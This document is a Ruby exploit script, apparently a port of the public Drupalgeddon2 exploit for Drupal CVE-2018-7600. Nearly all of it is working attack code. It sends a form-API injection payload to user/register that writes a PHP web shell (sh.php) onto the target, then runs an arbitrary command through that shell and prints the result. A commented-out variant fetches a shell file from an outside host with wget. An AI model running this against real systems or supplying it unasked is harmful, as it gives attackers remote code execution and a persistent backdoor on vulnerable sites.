#!/usr/bin/env ruby
#
# Hans Topo ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/    (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
# Based on Vitalii Rudnykh exploit ~ https://github.com/a2u/CVE-2018-7600	                      (EDBID: 44448 ~ https://www.exploit-db.com/exploits/44448/)
#
# Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
# Vulnerable:
#          < 7.58
#    8.x   < 8.3.9
#    8.4.x < 8.4.6
#    8.5.x < 8.5.1
#
# WriteUp & Thx ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
# REF phpinfo() ~ https://twitter.com/i_bo0om/status/984674893768921089                   (curl - user/register - #post_render)
# REF phpinfo() ~ https://twitter.com/RicterZ/status/984495201354854401                   (burp - user/<id>/edit [requires auth] - #lazy_builder)
# REF RCE       ~ https://gist.github.com/AlbinoDrought/626c07ee96bae21cb174003c9c710384  (curl - user/register - #post_render)
# REF rev_nc    ~ https://gist.github.com/AlbinoDrought/2854ca1b2a9a4f33ca87581cf1e1fdd4  (curl - user/register - #post_render)
# Collection    ~ https://github.com/g0rx/CVE-2018-7600-Drupal-RCE
#
# Drupal Fingerprint ~ https://example.com/CHANGELOG.txt
#

require 'cgi'
require 'net/http'
require 'openssl'

if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target> <command>"
  puts "       ruby drupalgeddon2.rb https://example.com whoami"
  exit
end

puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80

target = ARGV[0]
command = ARGV[1]

if not target.start_with?('http')
  target = "http://" + target
end

if not target.end_with?('/')
  target += "/"
end

puts "[*] Target : " + target
puts "[*] Command: " + command

url = target + 'user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'

#evil = 'wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/sh.php'
evil = 'echo "<?php system($_GET[\"c\"]); ?>" > sh.php'

# Vulnerable Parameters: access_callback / lazy_builder  / pre_render/ post_render
payload = CGI.escape('mail[#markup]=' + evil + '&mail[#type]=markup&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec')
#payload = "{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#lazy_builder][0]': 'exec', 'mail[#lazy_builder][1][]': '" + evil + "'}"
#payload = "{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '" + evil + "'}"

uri = URI(url)

http = Net::HTTP.new(uri.host,uri.port)

if uri.scheme == 'https'
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

req = Net::HTTP::Post.new(uri.path)
req.body = payload
puts "[*] Payload: " + evil
#puts "[*] Sending: " + payload
puts "-"*80
response = http.request(req)

if response.code != "200"
  puts "[!] Target does NOT seem to be exploitable ~ Response: " + response.code
  exit
end

puts "[+] Target seems to be exploitable! w00hooOO!"
puts "-"*80

puts "[*]   curl " + target + "sh.php?c=#{command}"
puts "-"*80
exploit_uri = URI(target + "sh.php?c=#{command}")

response = Net::HTTP.get_response(exploit_uri)

if response.code != "200"
  puts "[!] Exploit FAILED ~ Response: " + response.code
  exit
end

puts "[+] Output: " + response.body
